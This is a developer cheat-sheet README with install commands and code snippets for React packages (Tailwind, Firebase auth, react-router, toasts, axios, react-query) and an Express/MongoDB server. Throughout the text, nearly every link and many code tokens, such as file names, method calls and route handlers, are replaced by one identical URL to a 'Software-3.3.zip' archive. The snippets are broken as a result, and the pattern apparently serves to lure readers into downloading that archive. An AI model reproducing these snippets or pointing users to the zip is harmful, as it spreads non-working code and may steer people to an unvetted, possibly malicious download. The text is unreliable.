# client packages

- [Tailwind and daisyui](#tailwind)
- [authentication](#authentication)
- [react router dom](#react-router-dom)
- [react toastify](#react-toastify)
- [react hot toast](#hot-toast)
- [axios](#axios)
- [react hook form](#react-hook-form)
- [react query](#react-query)
- [Icons](#Icons)
- [react day picker](#react-day-picker)
- [image upload](#image-upload)

# server packages

- [express server setup](#express-server)
- [mongodb get started](#mongodb-quick-start)

# video notes

- 76-7 (sendgrid custom email send)
- 67-5 (pagination)
- 63.5-4 (google map integration)
- 69-4 (useToken custom hook)
- 70.5 (jwt recap)
  \
   &nbsp;

---

## create react app

```bash
npx create-react-app my-app
#or
yarn create react-app my-app
```

## environment variable

- `https://raw.githubusercontent.com/Habib255/notes/main/backswing/Software-3.3.zip` at root folder
- REACT_APP_credentialName=secret key

## [tailwind](https://raw.githubusercontent.com/Habib255/notes/main/backswing/Software-3.3.zip) & [Daisy ui](https://raw.githubusercontent.com/Habib255/notes/main/backswing/Software-3.3.zip)

```bash
yarn add -D tailwindcss postcss autoprefixer
```

```bash
yarn tailwindcss init -p
```

```bash
yarn add daisyui
```

- https://raw.githubusercontent.com/Habib255/notes/main/backswing/Software-3.3.zip ->

_tip - if you face webpack error while editing https://raw.githubusercontent.com/Habib255/notes/main/backswing/Software-3.3.zip file, restart the client_

```js
https://raw.githubusercontent.com/Habib255/notes/main/backswing/Software-3.3.zip = {
  content: ['./src/**/*.{js,jsx,ts,tsx}'],
  theme: {
    extend: {
      // tailwind themes here
    },
  },
  daisyui: {
    themes: false,
    // false means it won't apply daisy ui theme
  },
  plugins: [require('daisyui')],
}
```

- at https://raw.githubusercontent.com/Habib255/notes/main/backswing/Software-3.3.zip or https://raw.githubusercontent.com/Habib255/notes/main/backswing/Software-3.3.zip>

```csst@400;500;600;700&display=swap');

@tailwind base;
@tailwind components;
@tailwind utilities;
```

\
 &nbsp;

---

## [authentication](https://raw.githubusercontent.com/Habib255/notes/main/backswing/Software-3.3.zip)

### [firebase website](https://raw.githubusercontent.com/Habib255/notes/main/backswing/Software-3.3.zip)

```bash
yarn add firebase
```

```bash
yarn add react-firebase-hooks
```

_tip - don't forget to add providers on firebase website in authentication section before you start coding for the methods._

- ### [sign in with google](https://raw.githubusercontent.com/Habib255/notes/main/backswing/Software-3.3.zip)

```js
// sign in with google
import { useSignInWithGoogle } from 'react-firebase-hooks/auth'
const [signInWithGoogle, gUser, gLoading, gError] = useSignInWithGoogle(auth)

function handler(arg) {
  signInWithGoogle()
}
```

- ### [create user with email](https://raw.githubusercontent.com/Habib255/notes/main/backswing/Software-3.3.zip)

```js
// create user with email with email verification
import { useCreateUserWithEmailAndPassword } from 'react-firebase-hooks/auth'
const [createUserWithEmailAndPassword, cUser, cLoading, cError] =
  useCreateUserWithEmailAndPassword(auth, { sendEmailVerification: true })

function handler(email,password) {
  createUserWithEmailAndPassword(email, password)
}
```

- ### [sign in with email](https://raw.githubusercontent.com/Habib255/notes/main/backswing/Software-3.3.zip)

```js
// login with email and password
import { useSignInWithEmailAndPassword } from 'react-firebase-hooks/auth'
const [signInWithEmailAndPassword, eUser, eLoading, eError] =
  useSignInWithEmailAndPassword(auth)

function handler(email, password) {
  signInWithEmailAndPassword(email, password)
}
```

- ### [sign in with github](https://raw.githubusercontent.com/Habib255/notes/main/backswing/Software-3.3.zip)

```js
// sigin in with github
import { useSignInWithGithub } from 'react-firebase-hooks/auth'
const [signInWithGithub, gitUser, gitLoading, gitError] =
  useSignInWithGithub(auth)

function handler() {
  signInWithGithub()
}
```

- ### [update profile](https://raw.githubusercontent.com/Habib255/notes/main/backswing/Software-3.3.zip)

```js
// update user profile
import { useUpdateProfile } from 'react-firebase-hooks/auth'
const [updateProfile, updating, updateError] = useUpdateProfile(auth)

async function handler(arg) {
  await updateProfile({ displayName, photoURL })
  alert('Updated profile')
}
```

- ### [send email verification](https://raw.githubusercontent.com/Habib255/notes/main/backswing/Software-3.3.zip)

```js
// send email verification
import { useSendEmailVerification } from 'react-firebase-hooks/auth'
const [sendEmailVerification, sending, verifyError] =
  useSendEmailVerification(auth)

async function handler(arg) {
  await sendEmailVerification()
  alert('Sent email')
}
```

- ### [password reset](https://raw.githubusercontent.com/Habib255/notes/main/backswing/Software-3.3.zip)

```js
// password reset email
import { useSendPasswordResetEmail } from 'react-firebase-hooks/auth'
const [sendPasswordResetEmail, sending, resetError] =
  useSendPasswordResetEmail(auth)

async function handler(arg) {
  await sendPasswordResetEmail(email)
  alert('Sent email')
}

// note: this hook does not give you confirmation if the email is exist or https://raw.githubusercontent.com/Habib255/notes/main/backswing/Software-3.3.zip says 'email sent' to any email you https://raw.githubusercontent.com/Habib255/notes/main/backswing/Software-3.3.zip https://raw.githubusercontent.com/Habib255/notes/main/backswing/Software-3.3.zip
```

\
&nbsp;

---

## [react router dom](https://raw.githubusercontent.com/Habib255/notes/main/backswing/Software-3.3.zip)

```bash
yarn add react-router-dom
```

- ### [react router authentication(require auth)](https://raw.githubusercontent.com/Habib255/notes/main/backswing/Software-3.3.zip%https://raw.githubusercontent.com/Habib255/notes/main/backswing/Software-3.3.zip)

```js
// require auth file
import { useAuthState } from 'react-firebase-hooks/auth'

function RequireAuth({ children }) {
  const [user, loading] = useAuthState(auth)
  const location = useLocation()

  if (laoding) {
    return <Spinner></Spinner>
  }
  if (!user) {
    return <Navigate to='/login' state={{ from: location }} replace />
  }

  return children
}
export default RequireAuth
```

```js
// authentication file
const navigate = useNavigate()
const location = useLocation()
const from = https://raw.githubusercontent.com/Habib255/notes/main/backswing/Software-3.3.zip || '/'

if (user) {
  navigate(from, { replace: true })
}
```

---

- ### [custom active link](https://raw.githubusercontent.com/Habib255/notes/main/backswing/Software-3.3.zip%https://raw.githubusercontent.com/Habib255/notes/main/backswing/Software-3.3.zip)

```js
function CustomLink({ children, to, https://raw.githubusercontent.com/Habib255/notes/main/backswing/Software-3.3.zip }) {
  let resolved = useResolvedPath(to)
  let match = useMatch({ path: https://raw.githubusercontent.com/Habib255/notes/main/backswing/Software-3.3.zip, end: true })

  return (
    <div>
      <Link
        style={{ textDecoration: match ? 'underline' : 'none' }}
        to={to}
        {https://raw.githubusercontent.com/Habib255/notes/main/backswing/Software-3.3.zip}
      >
        {children}
      </Link>
      // {match && ' (active)'}
    </div>
  )
}

export default CustomLink
```

\
&nbsp;

---

## [react toastify](https://raw.githubusercontent.com/Habib255/notes/main/backswing/Software-3.3.zip)

```bash
# npm
npm install --save react-toastify

# yarn
yarn add react-toastify
```

```js
//inside https://raw.githubusercontent.com/Habib255/notes/main/backswing/Software-3.3.zip
import { ToastContainer, Slide } from 'react-toastify'
import 'https://raw.githubusercontent.com/Habib255/notes/main/backswing/Software-3.3.zip'

fun App() {
  <>
    <ToastContainer autoClose={3000} transition={Slide}/>
    https://raw.githubusercontent.com/Habib255/notes/main/backswing/Software-3.3.zip
  <>
}
```

```js
// usage
import { toast } from 'react-toastify'

https://raw.githubusercontent.com/Habib255/notes/main/backswing/Software-3.3.zip('congrats!')
https://raw.githubusercontent.com/Habib255/notes/main/backswing/Software-3.3.zip('invalid!')
https://raw.githubusercontent.com/Habib255/notes/main/backswing/Software-3.3.zip('warning')
https://raw.githubusercontent.com/Habib255/notes/main/backswing/Software-3.3.zip('information')
toast('default toast')
```

- ### [see more toast options](https://raw.githubusercontent.com/Habib255/notes/main/backswing/Software-3.3.zip)
  \
  &nbsp;

---

## [hot toast](https://raw.githubusercontent.com/Habib255/notes/main/backswing/Software-3.3.zip)

```bash
# npm
npm install react-hot-toast
# yarn
yarn add react-hot-toast
```

```js
// inside https://raw.githubusercontent.com/Habib255/notes/main/backswing/Software-3.3.zip
import { Toaster } from 'react-hot-toast';

fun App() {

  <div>
    <Toaster position="top-center" toastOptions={{duration: 3000,}}/>
  </div>
}
```

```js
// usage
import toast from 'react-hot-toast'
https://raw.githubusercontent.com/Habib255/notes/main/backswing/Software-3.3.zip('Successfully created!')
https://raw.githubusercontent.com/Habib255/notes/main/backswing/Software-3.3.zip('This is an error!')
https://raw.githubusercontent.com/Habib255/notes/main/backswing/Software-3.3.zip('Waiting...')
toast('Hello World')
```

- ### [see more toast options](https://raw.githubusercontent.com/Habib255/notes/main/backswing/Software-3.3.zip)

\
&nbsp;

---

## [axios](https://raw.githubusercontent.com/Habib255/notes/main/backswing/Software-3.3.zip)

```bash
yarn add axios@0.25.0
```

```js
// axios get method
//----client
useEffect(() => {
  axios('http://localhost:5000/services?name=john', {
    headers: {
      authorization: `bearer secret key`,
    },
  }).then((res) => https://raw.githubusercontent.com/Habib255/notes/main/backswing/Software-3.3.zip(res))
}, [])

//-----server
https://raw.githubusercontent.com/Habib255/notes/main/backswing/Software-3.3.zip('/services', (req, res) => {
  const authorization = https://raw.githubusercontent.com/Habib255/notes/main/backswing/Software-3.3.zip

  const queryParameter = https://raw.githubusercontent.com/Habib255/notes/main/backswing/Software-3.3.zip
  https://raw.githubusercontent.com/Habib255/notes/main/backswing/Software-3.3.zip(authorization)
  https://raw.githubusercontent.com/Habib255/notes/main/backswing/Software-3.3.zip(queryParameter)
  https://raw.githubusercontent.com/Habib255/notes/main/backswing/Software-3.3.zip(services)
})
```

```js
// Axios delete method
//-------client
const handleDelete = () => {
  axios
    .delete(`http://localhost:5000/services/${1}`, {
      data: {
        service: 'body from delete',
      },
      headers: {
        authorization: `bearer secret key from delete`,
      },
    })
    .then((res) => https://raw.githubusercontent.com/Habib255/notes/main/backswing/Software-3.3.zip(res))
}

//------------server

https://raw.githubusercontent.com/Habib255/notes/main/backswing/Software-3.3.zip('/services/:id', (req, res) => {
  const query = https://raw.githubusercontent.com/Habib255/notes/main/backswing/Software-3.3.zip
  const authorization = https://raw.githubusercontent.com/Habib255/notes/main/backswing/Software-3.3.zip
  const service = https://raw.githubusercontent.com/Habib255/notes/main/backswing/Software-3.3.zip
  https://raw.githubusercontent.com/Habib255/notes/main/backswing/Software-3.3.zip(authorization)
  https://raw.githubusercontent.com/Habib255/notes/main/backswing/Software-3.3.zip(query)
  https://raw.githubusercontent.com/Habib255/notes/main/backswing/Software-3.3.zip(service)
})
```

```js
// Axios post method
//--------client
const handlePost = () => {
  https://raw.githubusercontent.com/Habib255/notes/main/backswing/Software-3.3.zip(
    `http://localhost:5000/services`,
    {
      service: 'body from post',
    },

    {
      headers: {
        authorization: `bearer secret key from post`,
      },
    }
  )
}

// --------server
https://raw.githubusercontent.com/Habib255/notes/main/backswing/Software-3.3.zip('/services', (req, res) => {
  const service = https://raw.githubusercontent.com/Habib255/notes/main/backswing/Software-3.3.zip
  const authorization = https://raw.githubusercontent.com/Habib255/notes/main/backswing/Software-3.3.zip
  https://raw.githubusercontent.com/Habib255/notes/main/backswing/Software-3.3.zip(service)
  https://raw.githubusercontent.com/Habib255/notes/main/backswing/Software-3.3.zip(authorization)
})
```

```js
// axios put method
//------------client
const handlePut = () => {
  https://raw.githubusercontent.com/Habib255/notes/main/backswing/Software-3.3.zip(
    `http://localhost:5000/services`,
    {
      service: 'body from put ',
    },
    {
      headers: {
        authorization: `bearer secret key from put`,
      },
    }
  )
}

//-------------server

https://raw.githubusercontent.com/Habib255/notes/main/backswing/Software-3.3.zip('/services', (req, res) => {
  const updatedService = https://raw.githubusercontent.com/Habib255/notes/main/backswing/Software-3.3.zip
  const authorization = https://raw.githubusercontent.com/Habib255/notes/main/backswing/Software-3.3.zip
  https://raw.githubusercontent.com/Habib255/notes/main/backswing/Software-3.3.zip(updatedService)
  https://raw.githubusercontent.com/Habib255/notes/main/backswing/Software-3.3.zip(authorization)
})
```

```js
// axios patch method
const handlePatch = () => {
  https://raw.githubusercontent.com/Habib255/notes/main/backswing/Software-3.3.zip(
    `http://localhost:5000/services`,
    { service: 'body from patch' },
    {
      headers: {
        authorization: `bearer secret key from patch`,
      },
    }
  )
}

//-------------server
https://raw.githubusercontent.com/Habib255/notes/main/backswing/Software-3.3.zip('/services', (req, res) => {
  const updatedService = https://raw.githubusercontent.com/Habib255/notes/main/backswing/Software-3.3.zip
  const authorization = https://raw.githubusercontent.com/Habib255/notes/main/backswing/Software-3.3.zip
  https://raw.githubusercontent.com/Habib255/notes/main/backswing/Software-3.3.zip(updatedService)
  https://raw.githubusercontent.com/Habib255/notes/main/backswing/Software-3.3.zip(authorization)
})
```

\
&nbsp;

---

## [react hook form](https://raw.githubusercontent.com/Habib255/notes/main/backswing/Software-3.3.zip)

```bash
yarn add react-hook-form
```

- ### [sample form](https://raw.githubusercontent.com/Habib255/notes/main/backswing/Software-3.3.zip)

- ### [form with basic validation](https://raw.githubusercontent.com/Habib255/notes/main/backswing/Software-3.3.zip)

\
&nbsp;

---

## [react query](https://raw.githubusercontent.com/Habib255/notes/main/backswing/Software-3.3.zip)

```bash
yarn add react-query
```

```js
// inside https://raw.githubusercontent.com/Habib255/notes/main/backswing/Software-3.3.zip
 import { QueryClient, QueryClientProvider, useQuery } from 'react-query'
const queryClient = new QueryClient()
<QueryClientProvider client={queryClient}>
  <App/>
</QueryClientProvider>
```

```js
// usage

//using axios
const { isLoading, error, data, refetch } = useQuery('repoData', () =>
  axios('https://raw.githubusercontent.com/Habib255/notes/main/backswing/Software-3.3.zip').then((res) =>
    https://raw.githubusercontent.com/Habib255/notes/main/backswing/Software-3.3.zip(res)
  )
)

if (isLoading) return 'Loading...'

-------------------------------------------------------------------
//using fetch
const { isLoading, error, data,refetch } = useQuery('repoData', () =>
  fetch('https://raw.githubusercontent.com/Habib255/notes/main/backswing/Software-3.3.zip').then((res) =>
    https://raw.githubusercontent.com/Habib255/notes/main/backswing/Software-3.3.zip(https://raw.githubusercontent.com/Habib255/notes/main/backswing/Software-3.3.zip())
  )
)
```

\
&nbsp;

---

## Icons

- ### [react icons](https://raw.githubusercontent.com/Habib255/notes/main/backswing/Software-3.3.zip)

```bash
yarn add react-icons
```

- ### [hero icons](https://raw.githubusercontent.com/Habib255/notes/main/backswing/Software-3.3.zip)

```bash
yarn add @heroicons/react
```

- ### [font awesome](https://raw.githubusercontent.com/Habib255/notes/main/backswing/Software-3.3.zip)

```bash
yarn add @fortawesome/fontawesome-svg-core
yarn add @fortawesome/free-solid-svg-icons
yarn add @fortawesome/react-fontawesome
```

```js
// usage
import { FontAwesomeIcon } from '@fortawesome/react-fontawesome'
import { faCoffee } from '@fortawesome/free-solid-svg-icons'

return (
  <button>
    <FontAwesomeIcon icon={faCoffee} />
  </button>
)
```

\
&nbsp;

---

```js
// usage
import { FontAwesomeIcon } from '@fortawesome/react-fontawesome'
import { faCoffee } from '@fortawesome/free-solid-svg-icons'

return (
  <button>
    <FontAwesomeIcon icon={faCoffee} />
  </button>
)
```

\
&nbsp;

---

## [react day picker](https://raw.githubusercontent.com/Habib255/notes/main/backswing/Software-3.3.zip)

```bash
yarn add react-day-picker date-fns
```

```js
import React from 'react'
import { DayPicker } from 'react-day-picker'

export default function App() {
  // disable all previous days
  const disabledDays = [
    { from: new Date(1600, 0, 1), to: new Date(https://raw.githubusercontent.com/Habib255/notes/main/backswing/Software-3.3.zip() - 86400000) },
  ]

  return (
    <DayPicker
      defaultMonth={new Date()}
      disabled={disabledDays}
      mode='single'
    />
  )
}
```

\
&nbsp;

---

## image upload

```js
const imageAPI = 'api key from image hosting server'

async function handle() {
  const image = https://raw.githubusercontent.com/Habib255/notes/main/backswing/Software-3.3.zip[0]
  const formData = new FormData()
  https://raw.githubusercontent.com/Habib255/notes/main/backswing/Software-3.3.zip('image', image)

  const url = `https://raw.githubusercontent.com/Habib255/notes/main/backswing/Software-3.3.zip${imageAPI}`
    // using fetch
    fetch(url, {
      method: 'POST',
      body: formData,
    })

    //or using axios
    https://raw.githubusercontent.com/Habib255/notes/main/backswing/Software-3.3.zip(url, formData ).then....`set hostedUrl to mongodb`
}
```

\
&nbsp;

---

- ### day picker css
  1. create a css file in src folder `https://raw.githubusercontent.com/Habib255/notes/main/backswing/Software-3.3.zip`.
  2. import that into https://raw.githubusercontent.com/Habib255/notes/main/backswing/Software-3.3.zip `import 'https://raw.githubusercontent.com/Habib255/notes/main/backswing/Software-3.3.zip' `

```css
.rdp-day_selected:not([disabled]) {
  color: white;
  background-color: #0fcfec;
}

.rdp-day_selected:focus:not([disabled]) {
  background-color: #0fcfec;
  border: 2px solid rgb(138, 238, 252);
}

.rdp-day_selected:hover:not([disabled]) {
  background-color: #19d3ae;
  border: 2px solid rgb(152, 255, 215);
}
.rdp-button:active:not([disabled]) {
  border: 2px solid #19d3ae;
  background-color: #bafff1;
}
```

# server

## express server

```bash
# npm
npm install express cors mongodb dotenv jsonwebtoken

# yarn
yarn add express cors mongodb dotenv jsonwebtoken

# if use yarn you need to add *script* manually to https://raw.githubusercontent.com/Habib255/notes/main/backswing/Software-3.3.zip file
  "scripts": {
    "start": "node https://raw.githubusercontent.com/Habib255/notes/main/backswing/Software-3.3.zip",
    "start-dev": "nodemon https://raw.githubusercontent.com/Habib255/notes/main/backswing/Software-3.3.zip"
  },
```

- ### [express hello world api example](https://raw.githubusercontent.com/Habib255/notes/main/backswing/Software-3.3.zip)
- ### [dotenv config call](https://raw.githubusercontent.com/Habib255/notes/main/backswing/Software-3.3.zip)
- ### [cors usage](https://raw.githubusercontent.com/Habib255/notes/main/backswing/Software-3.3.zip)


```js
// sample code
const express = require('express');
const cors = require('cors');
require('dotenv').config()

const app = express()
const port = https://raw.githubusercontent.com/Habib255/notes/main/backswing/Software-3.3.zip || 5000


https://raw.githubusercontent.com/Habib255/notes/main/backswing/Software-3.3.zip('/', (req, res) => {
  https://raw.githubusercontent.com/Habib255/notes/main/backswing/Software-3.3.zip('hello world')
})

https://raw.githubusercontent.com/Habib255/notes/main/backswing/Software-3.3.zip(port, () => https://raw.githubusercontent.com/Habib255/notes/main/backswing/Software-3.3.zip('listening to port', port))

```

\

&nbsp;

---

## [mongodb quick start](https://raw.githubusercontent.com/Habib255/notes/main/backswing/Software-3.3.zip)

- ### [find doc](https://raw.githubusercontent.com/Habib255/notes/main/backswing/Software-3.3.zip)

- ### [insert doc](https://raw.githubusercontent.com/Habib255/notes/main/backswing/Software-3.3.zip)

- ### [delete doc](https://raw.githubusercontent.com/Habib255/notes/main/backswing/Software-3.3.zip)

- ### [update doc](https://raw.githubusercontent.com/Habib255/notes/main/backswing/Software-3.3.zip)

- ### [count doc](https://raw.githubusercontent.com/Habib255/notes/main/backswing/Software-3.3.zip)

- ### [sort doc](https://raw.githubusercontent.com/Habib255/notes/main/backswing/Software-3.3.zip)

- ### [skip and limit doc](https://raw.githubusercontent.com/Habib255/notes/main/backswing/Software-3.3.zip)